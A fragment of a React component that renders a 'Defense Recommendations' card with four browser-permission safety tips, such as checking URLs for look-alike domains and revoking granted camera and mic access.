      <Card className="border-blue-500/20 bg-blue-500/5">
        <CardHeader className="pb-2">
          <CardTitle className="text-sm flex items-center gap-2 text-blue-400">
            <Shield className="w-4 h-4" />
            Defense Recommendations
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3 text-xs text-muted-foreground">
          <div className="grid gap-3 sm:grid-cols-2">
            <div className="flex gap-2">
              <CheckCircle2 className="w-4 h-4 text-green-400 flex-shrink-0 mt-0.5" />
              <div>
                <p className="font-medium text-foreground">Never grant permissions to unknown sites</p>
                <p>Legitimate services rarely need camera, mic, and location together.</p>
              </div>
            </div>
            <div className="flex gap-2">
              <CheckCircle2 className="w-4 h-4 text-green-400 flex-shrink-0 mt-0.5" />
              <div>
                <p className="font-medium text-foreground">Check the URL carefully</p>
                <p>Attackers use look-alike domains to trick users into granting access.</p>
              </div>
            </div>
            <div className="flex gap-2">
              <CheckCircle2 className="w-4 h-4 text-green-400 flex-shrink-0 mt-0.5" />
              <div>
                <p className="font-medium text-foreground">Revoke permissions regularly</p>
                <p>Check browser settings periodically to remove granted permissions.</p>
              </div>
            </div>
            <div className="flex gap-2">
              <CheckCircle2 className="w-4 h-4 text-green-400 flex-shrink-0 mt-0.5" />
              <div>
                <p className="font-medium text-foreground">Use browser privacy indicators</p>
                <p>Modern browsers show icons when camera/mic are active. Watch for them.</p>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
